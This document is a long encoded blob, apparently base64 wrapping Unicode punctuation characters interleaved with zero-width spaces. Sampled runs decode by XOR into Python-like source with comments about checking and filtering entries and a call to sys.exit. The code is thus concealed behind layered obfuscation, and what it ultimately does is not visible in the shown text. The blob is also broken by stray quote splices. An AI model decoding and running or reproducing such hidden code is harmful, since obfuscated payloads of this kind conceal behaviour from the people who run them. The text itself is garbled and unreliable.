4oCr4oCL4oGI4oCL4oGD4oCL4oGO4oCL4oGI4oCL4oGA4oCL4oCr4oCL4oGC4oCL4oGf4oCL4oCr\n4oCL4oGK4oCL4oGM4oCL4oGK4oCL4oGC4oCL4oGF4oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oG44oCL4oGy\n4oCL4oG44oCL4oCl4oCL4oGu4oCL4oGz4oCL4oGi4oCL4oG/4oCL4oCj4oCL4oCi4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCo4oCL4oCr4oCL4oGN4oCL4oGi4oCL4oGn4oCL4oG/4oCL4oGu4oCL4oG5\n4oCL4oCr4oCL4oGk4oCL4oGl4oCL4oGn4oCL4oGy4oCL4oCr4oCL4oGn4oCL4oGi4oCL4oGl4oCL4oGu\n4oCL4oG44oCL4oCr4oCL4oG/4oCL4oGj4oCL4oGq4oCL4oG/4oCL4oCr4oCL4oGo4oCL4oGk4oCL4oGl\n4oCL4oG/4oCL4oGq4oCL4oGi4oCL4oGl4oCL4oCr4oCL4oCs4oCL4oG34oCL4oCs4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG94oCL4oGq4oCL4oGn4oCL4oGi4oCL4oGv\n4oCL4oGU4oCL4oGu4oCL4oGl4oCL4oG/4oCL4oG54oCL4oGi4oCL4oGu4oCL4oG44oCL4oCr4oCL4oC2\n4oCL4oCr4oCL4oGQ4oCL4oGn4oCL4oGi4oCL4oGl4oCL4oGu4oCL4oCl4oCL4oG44oCL4oG/4oCL4oG5\n4oCL4oGi4oCL4oG74oCL4oCj4oCL4oCi4oCL4oCr4oCL4oGt4oCL4oGk4oCL4oG54oCL4oCr4oCL4oGn\n4oCL4oGi4oCL4oGl4oCL4oGu4oCL4oCr4oCL4oGi4oCL4oGl4oCL4oCr4oCL4oGn4oCL4oGi4oCL4oGl\n4oCL4oGu4oCL4oG44oCL4oCr4oCL4oGi4oCL4oGt4oCL4oCr4oCL4oCs4oCL4oG34oCL4oCs4oCL4oCr\n4oCL4oGi4oCL4oGl4oCL4oCr4oCL4oGn4oCL4o""Gi4oCL4oGl4oCL4oGu4oCL4oGW4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCo4oCL4oCr4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGm4oCL4oGq4oCL4oG/\n4oCL4oCr4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL4oCr4oCL4oGu4oCL4oGl4oCL4oG/4oCL4oG5\n4oCL4oGy4oCL4oCr4oCL4oGt4oCL4oGk4oCL4oG54oCL4oCr4oCL4oGo4oCL4oGk4oCL4oGm4oCL4oG7\n4oCL4oGq4oCL4oG54oCL4oGi4oCL4oG44oCL4oGk4oCL4oGl4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL4oGU4oCL4oGu4oCL4oGl\n4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCr4oCL4oC24oCL4oCr4oCL4oGt4oCL4oCp4oCL4oGw4oCL4oGf\n4oCL4oGk4oCL4oGg4oCL4oGu4oCL4oGl4oCL4oG24oCL4oG34oCL4oGw4oCL4oGC4oCL4oGP4oCL4oG2\n4oCL4oCp4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCo4oCL4oCr4oCL4oGI4oCL4oGj4oCL4oGu\n4oCL4oGo4oCL4oGg4oCL4oCr4oCL4oGt4oCL4oGk4oCL4oG54oCL4oCr4oCL4oGm4oCL4oGq4oCL4oG/\n4oCL4oGo4oCL4oGj4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGi\n4oCL4oGt4oCL4oCr4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL4oGU4oCL4oGu4oCL4oGl4oCL4oG/\n4oCL4oG54oCL4oGy4oCL4oCr4oCL4oGi4oCL4oGl4oCL4oCr4oCL4oG94oCL4oGq4oCL4oGn4oCL4oGi\n4oCL4oGv4oCL4oGU4oCL4oGu4oCL4oGl4oCL4oG/4oCL4oG54oCL4oGi4oCL4oGu4oCL4oG44oCL4oCx\n4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr\n4oCL4oCr4oCL4oG74oCL4oG54oCL4oGi4oCL4oGl4oCL4oG/4oCL4oCj4oCL4oCp4oCL3I7igIvigKvi\ngIvigYrigIvigajigIvigajigIviga7igIvigbjigIvigbjigIvigKvigIvigYzigIvigbnigIvigari\ngIvigaXigIvigb/igIviga7igIviga/igIvigKXigIvigKvigIvigZzigIviga7igIvigafigIvigaji\ngIvigaTigIvigabigIviga7igIvigKrigIvigKnigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHi\ngIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKjigIvigKvigIvigZvi\ngIvigbnigIvigaTigIvigajigIviga7igIviga7igIviga/igIvigKvigIvigbzigIvigaLigIvigb/i\ngIvigaPigIvigKvigIvigb/igIvigaPigIviga7igIvigKvigIvigbnigIviga7igIvigbjigIvigb/i\ngIvigKvigIvigaTigIviga3igIvigKvigIvigbLigIvigaTigIvigb7igIvigbnigIvigK""vigIvigb/i\ngIvigaTigIvigaTigIvigafigIvigKvigIvigaPigIviga7igIvigbnigIviga7igIvigIHigIvigIHi\ngIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIviga7igIvigafigIvigbjigIviga7igIvigLHi\ngIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvi\ngIvigKvigIvigbvigIvigbnigIvigaLigIvigaXigIvigb/igIvigKPigIvigKnigIvdh+KAi+KAq+KA\ni+KBn+KAi+KBhOKAi+KBhOKAi+KBh+KAi+KAq+KAi+KBguKAi+KBmOKAi+KAq+KAi+KBheKAi+KBhOKA\ni+KBn+KAi+KAq+KAi+KBiuKAi+KBneKAi+KBiuKAi+KBguKAi+KBh+KAi+KBiuKAi+KBieKAi+KBh+KA\ni+KBjuKAi+KAq+KAi+KBjeKAi+KBhOKAi+KBmeKAi+KAq+KAi+KBkuKAi+KBhOKAi+KBnuKAi+KApeKA\ni+KAq+KAi+KBm+KAi+KBnuKAi+KBmeKAi+KBiOKAi+KBg+KAi+KBiuKAi+KBmOKAi+KBjuKAi+KAq+KA\ni+KBjeKAi+KBmeKAi+KBhOKAi+KBhuKAi+KAq+KAi+KBn+KAi+KBg+KAi+KBjuKAi+KAq+KAi+KBhOKA\ni+KBnOKAi+KBheKAi+KBjuKAi+KBmeKAi+KAseKAi+KAq+KAi+KBi+KAi+KBpuKAi+KBpuKAi+KBo+KA\ni+KBo+KAi+KBpeKAi+KAqeKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBuOKAi+KBsuKAi+KBuOKAi+KApeKAi+KBruKA\ni+KBs+KAi+KBouKAi+KBv+KAi+KAo+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KBr+KAi+KBruKAi+KBreKAi+KAq+KAi+KBu+KAi+KBu+KAi+KBu+KAi+KBu+KA\ni+KAo+KAi+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBrOKAi+KBp+KAi+KBpOKAi+KBqeKAi+KBquKAi+KBp+KA\ni+KAq+KAi+KBqeKAi+KBquKAi+KBr+KAi+KBouKAi+KBpeKAi+KBuOKAi+KBv+KAi+KBquKAi+KAp+KA\ni+KBo+KAi+KBouKAi+KBv+KAi+KBuOKAi+KAp+KAi+KBqeKAi+KBquKAi+KBr+KAi+KBruKAi+KBpuKA\ni+KBquKAi+KBouKAi+KBp+KAi+KAp+KAi+KBrOKAi+KBpOKAi+KBpOKAi+KBr+KAi+KBouKAi+KBrOKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBqeKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBquKAi+KBpeKAi+KBr+KAi+KBpOKA\ni+KBpuKAi+KApeKAi+KBueKAi+KBquKAi+KBpeKAi+KBr+KAi+KBouKAi+KBpeKAi+KBv+KAi+KAo+KA\ni+KAvuKAi+KAp+KAi+KAueKAi+KAu+KAi+KAs+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBqeKAi+KBpOKAi+KAq+KA\ni+KAtuKAi+KAq+KAi+KB""reKAi+KArOKAi+KBl+KAi+KBs+KAi+KAuuKAi+KBqeKAi+KBkOKAi+KAuOKA\ni+KAs+KAi+KAsOKAi+KAvuKAi+KAsOKAi+KBsOKAi+KBqeKAi+KBtuKAi+KBpuKAi+KArOKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBpOKAi+KBuOKAi+KApeKAi+KBuOKAi+KBsuKAi+KBuOKAi+KBv+KAi+KBruKAi+KBpuKAi+KAo+KA\ni+KArOKAi+KBqOKAi+KBp+KAi+KBuOKAi+KArOKAi+KAq+KAi+KBouKAi+KBreKAi+KAq+KAi+KBpOKA\ni+KBuOKAi+KApeKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKAi+KAq+KAi+KAtuKAi+KAtuKAi+KAq+KA\ni+KArOKAi+KBpeKAi+KBv+KAi+KArOKAi+KAq+KAi+KBruKAi+KBp+KAi+KBuOKAi+KBruKAi+KAq+KA\ni+KArOKAi+KBqOKAi+KBp+KAi+KBruKAi+KBquKAi+KBueKAi+KArOKAi+KAouKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBpOKA\ni+KBvuKAi+KBv+KAi+KBu+KAi+KBvuKAi+KBv+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KAo+KAi+KBreKA\ni+KAqeKAi+KBl+KAi+KBpeKAi+KAqeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBreKAi+KAqeKAi+KBkOKAi+KBn+KAi+KBueKA\ni+KBvuKAi+KBruKAi+KBluKAi+KAseKAi+KBkOKAi+KBsOKAi+KBo+KAi+KBouKAi+KBv+KAi+KBuOKA\ni+KBtuKAi+KBluKAi+KBl+KAi+KBpeKAi+KAqeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBreKAi+KAqeKAi+KBkOKAi+KBjOKA\ni+KBruKAi+KBpeKAi+KBluKAi+KAseKAi+KBkOKAi+KBsOKAi+KBqeKAi+KBquKAi+KBr+KAi+KBouKA\ni+KBpeKAi+KBuOKAi+KBv+KAi+KBquKAi+KBtuKAi+KBluKAi+KBl+KAi+KBpeKAi+KAqeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBreKAi+KAqeKAi+KBkOKAi+KBieKAi+KBquKAi+KBr+KAi+KBluKAi+KAseKAi+KBkOKAi+KBsOKA\ni+KBqeKAi+KBquKAi+KBr+KAi+KBruKAi+KBpuKAi+KBquKAi+KBouKAi+KBp+KAi+KBtuKAi+KBluKA\ni+KBl+KAi+KBpeKAi+KAqeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KA""q+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBreKAi+KAqeKAi+KBkOKAi+KBheKAi+KBpOKAi+KBv+KA\ni+KBluKAi+KAseKAi+KBkOKAi+KBsOKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBr+KAi+KBouKAi+KBrOKA\ni+KBtuKAi+KBluKAi+KBl+KAi+KBpeKAi+KAqeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBreKAi+KAqeKAi+KBl+KAi+KBpeKA\ni+KBl+KAi+KBpeKAi+KAqeKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBuOKAi+KBsuKAi+KBuOKAi+KApeKAi+KBuOKA\ni+KBv+KAi+KBr+KAi+KBpOKAi+KBvuKAi+KBv+KAi+KApeKAi+KBvOKAi+KBueKAi+KBouKAi+KBv+KA\ni+KBruKAi+KAo+KAi+KBpOKAi+KBvuKAi+KBv+KAi+KBu+KAi+KBvuKAi+KBv+KAi+KAouKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBuOKAi+KBsuKAi+KBuOKAi+KApeKAi+KBuOKAi+KBv+KAi+KBr+KAi+KBpOKAi+KBvuKAi+KBv+KA\ni+KApeKAi+KBreKAi+KBp+KAi+KBvuKAi+KBuOKAi+KBo+KAi+KAo+KAi+KAouKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBsuKAi+KBsuKAi+KAq+KAi+KAtuKAi+KAq+KA\ni+KArOKAi+KBquKAi+KBseKAi+KBruKAi+KBueKAi+KBv+KAi+KBsuKAi+KBvuKAi+KBouKAi+KBpOKA\ni+KBu+KAi+KBpuKAi+KBp+KAi+KBoOKAi+KBoeKAi+KBo+KAi+KBrOKAi+KBreKAi+KBr+KAi+KBuOKA\ni+KBuuKAi+KBvOKAi+KBs+KAi+KBqOKAi+KBveKAi+KBqeKAi+KBpeKAi+KArOKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBr+KAi+KBruKAi+KBreKAi+KAq+KAi+KBv+KA\ni+KBp+KAi+KBp+KAi+KAo+KAi+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBv+KAi+KBueKAi+KBsuKAi+KAseKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBpeKAi+KAuuKAi+KAq+KAi+KAtuKAi+KAq+KA\ni+KArOKAi+KArOKAi+KApeKAi+KBoeKAi+KBpOKAi+KBouKAi+KBpeKAi+KAo+KAi+KBqOKAi+KBqOKA\ni+KAo+KAi+KBsuKAi+KBsuKAi+KAouKAi+KAq+KAi+KBreKAi+KBpOKAi+KBueKAi+KAq+KAi+KBouKA\ni+KAq+KAi+KBouKAi+KBpeKAi+KAq+KAi+KBueKAi+KBquKAi+KBpeKAi+KBrOKAi+KBruKAi+KAo+KA""\ni+KBueKAi+KBueKAi+KAo+KAi+KAveKAi+KAp+KAi+KAq+KAi+KAsuKAi+KAouKAi+KAouKAi+KAouKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBpeKAi+KAueKAi+KAq+KAi+KAtuKAi+KAq+KA\ni+KArOKAi+KArOKAi+KApeKAi+KBoeKAi+KBpOKAi+KBouKAi+KBpeKAi+KAo+KAi+KBqOKAi+KBqOKA\ni+KAo+KAi+KBsuKAi+KBsuKAi+KAouKAi+KAq+KAi+KBreKAi+KBpOKAi+KBueKAi+KAq+KAi+KBouKA\ni+KAq+KAi+KBouKAi+KBpeKAi+KAq+KAi+KBueKAi+KBquKAi+KBpeKAi+KBrOKAi+KBruKAi+KAo+KA\ni+KBueKAi+KBueKAi+KAo+KAi+KAuOKAi+KAp+KAi+KAq+KAi+KAsuKAi+KAouKAi+KAouKAi+KAouKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBo+KAi+KBpOKAi+KBuOKAi+KBv+KAi+KAq+KA\ni+KAtuKAi+KAq+KAi+KArOKAi+KArOKAi+KApeKAi+KBoeKAi+KBpOKAi+KBouKAi+KBpeKAi+KAo+KA\ni+KBqOKAi+KBqOKAi+KAo+KAi+KBsuKAi+KBsuKAi+KAouKAi+KAq+KAi+KBreKAi+KBpOKAi+KBueKA\ni+KAq+KAi+KBouKAi+KAq+KAi+KBouKAi+KBpeKAi+KAq+KAi+KBueKAi+KBquKAi+KBpeKAi+KBrOKA\ni+KBruKAi+KAo+KAi+KBueKAi+KBueKAi+KAo+KAi+KAuuKAi+KAvuKAi+KAp+KAi+KAq+KAi+KAuOKA\ni+KAu+KAi+KAouKAi+KAouKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBo+KA\ni+KBruKAi+KAuOKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBsOKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAqeKAi+KBquKAi+KBqOKAi+KBqOKAi+KBruKA\ni+KBu+KAi+KBv+KAi+KAqeKAi+KAseKAi+KAq+KAi+KAqeKAi+KAoeKAi+KApOKAi+KAoeKAi+KAqeKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAqeKAi+KBquKAi+KBqOKAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KApuKAi+KBp+KAi+KBquKA\ni+KBpeKAi+KBrOKAi+KBvuKAi+KBquKAi+KBrOKAi+KBruKAi+KAqeKAi+KAseKAi+KAq+KAi+KAqeKA\ni+KBquKAi+KBueKAi+KApuKAi+KBguKAi+KBmuKAi+KAp+KAi+KBquKAi+KBueKAi+KAsOKAi+KBuuKA\ni+KAtuKAi+KAu+KAi+KApeKAi+KAsu""KAi+KAp+KAi+KBruKAi+KBpeKAi+KApuKAi+KBguKAi+KBmuKA\ni+KAsOKAi+KBuuKAi+KAtuKAi+KAu+KAi+KApeKAi+KAs+KAi+KAp+KAi+KBruKAi+KBpeKAi+KAsOKA\ni+KBuuKAi+KAtuKAi+KAu+KAi+KApeKAi+KAvOKAi+KAp+KAi+KBruKAi+KBpeKAi+KApuKAi+KBnuKA\ni+KBmOKAi+KAsOKAi+KBuuKAi+KAtuKAi+KAu+KAi+KApeKAi+KAveKAi+KAqeKAi+KAp+KAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAqeKAi+KBqOKA\ni+KBpOKAi+KBpeKAi+KBv+KAi+KBruKAi+KBpeKAi+KBv+KAi+KApuKAi+KBv+KAi+KBsuKAi+KBu+KA\ni+KBruKAi+KAqeKAi+KAseKAi+KAq+KAi+KAqeKAi+KBquKAi+KBu+KAi+KBu+KAi+KBp+KAi+KBouKA\ni+KBqOKAi+KBquKAi+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KApOKAi+KBs+KAi+KApuKAi+KBvOKA\ni+KBvOKAi+KBvOKAi+KApuKAi+KBreKAi+KBpOKAi+KBueKAi+KBpuKAi+KApuKAi+KBvuKAi+KBueKA\ni+KBp+KAi+KBruKAi+KBpeKAi+KBqOKAi+KBpOKAi+KBr+KAi+KBruKAi+KBr+KAi+KAsOKAi+KBqOKA\ni+KBo+KAi+KBquKAi+KBueKAi+KBuOKAi+KBruKAi+KBv+KAi+KAtuKAi+KBnuKAi+KBn+KAi+KBjeKA\ni+KApuKAi+KAs+KAi+KAqeKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAqeKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBrOKAi+KBp+KAi+KBruKA\ni+KApuKAi+KBquKAi+KBqOKAi+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KBuOKAi+KApuKA\ni+KBs+KAi+KBuOKAi+KBueKAi+KBreKAi+KAqeKAi+KAseKAi+KAq+KAi+KAqeKAi+KAuuKAi+KAqeKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KArOKAi+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KApuKAi+KBquKAi+KBrOKAi+KBruKAi+KBpeKA\ni+KBv+KAi+KArOKAi+KAseKAi+KAq+KAi+KBuOKAi+KBv+KAi+KBueKAi+KAo+KAi+KBrOKAi+KBrOKA\ni+KBqeKAi+KAo+KAi+KAouKAi+KAouKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBtuKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBru""KAi+KBuOKAi+KAuuKA\ni+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBruKAi+KBuuKAi+KBvuKAi+KBruKAi+KBuOKAi+KBv+KA\ni+KBuOKAi+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBo+KAi+KBv+KAi+KBv+KAi+KBu+KA\ni+KBuOKAi+KAseKAi+KApOKAi+KApOKAi+KBquKAi+KBqOKAi+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKA\ni+KBv+KAi+KBuOKAi+KApeKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBrOKAi+KBp+KAi+KBruKAi+KApeKA\ni+KBqOKAi+KBpOKAi+KBpuKAi+KApOKAi+KBuOKAi+KBouKAi+KBrOKAi+KBpeKAi+KBouKAi+KBpeKA\ni+KApOKAi+KBveKAi+KAueKAi+KApOKAi+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KBpeKAi+KBquKA\ni+KBpuKAi+KBruKAi+KBueKAi+KBruKAi+KBqOKAi+KBpOKAi+KBveKAi+KBruKAi+KBueKAi+KBsuKA\ni+KAtOKAi+KBreKAi+KBp+KAi+KBpOKAi+KBvOKAi+KBheKAi+KBquKAi+KBpuKAi+KBruKAi+KAtuKA\ni+KBjOKAi+KBp+KAi+KBouKAi+KBreKAi+KBnOKAi+KBruKAi+KBqeKAi+KBmOKAi+KBouKAi+KBrOKA\ni+KBpeKAi+KBguKAi+KBpeKAi+KAreKAi+KBreKAi+KBp+KAi+KBpOKAi+KBvOKAi+KBjuKAi+KBpeKA\ni+KBv+KAi+KBueKAi+KBsuKAi+KAtuKAi+KBmOKAi+KBruKAi+KBueKAi+KBveKAi+KBouKAi+KBqOKA\ni+KBruKAi+KBh+KAi+KBpOKAi+KBrOKAi+KBouKAi+KBpeKAi+KAreKAi+KBo+KAi+KBp+KAi+KAtuKA\ni+KBruKAi+KBpeKAi+KApuKAi+KBjOKAi+KBieKAi+KArOKAi+KAp+KAi+KAq+KAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBo+KAi+KBruKAi+KBquKA\ni+KBr+KAi+KBruKAi+KBueKAi+KBuOKAi+KAtuKAi+KBo+KAi+KBruKAi+KAuOKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBv+KA\ni+KBpOKAi+KBoOKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBruKAi+KApeKAi+KBuOKAi+KBruKA\ni+KBquKAi+KBueKAi+KBqOKAi+KBo+KAi+KAo+KAi+KBueKAi+KArOKAi+KBr+KAi+KBquKAi+KBv+KA\ni+KBquKAi+KApuKAi+KBouKAi+KBpeKAi+KBouKAi+KBv+KAi+KBouKAi+KBquKAi+KBp+KAi+KApuKA\ni+KBuOKAi+KB""ruKAi+KBv+KAi+KBvuKAi+KBu+KAi+KApuKAi+KBr+KAi+KBquKAi+KBv+KAi+KBquKA\ni+KAtuKAi+KAqeKAi+KAruKAi+KApeKAi+KBi+KAi+KApeKAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KA\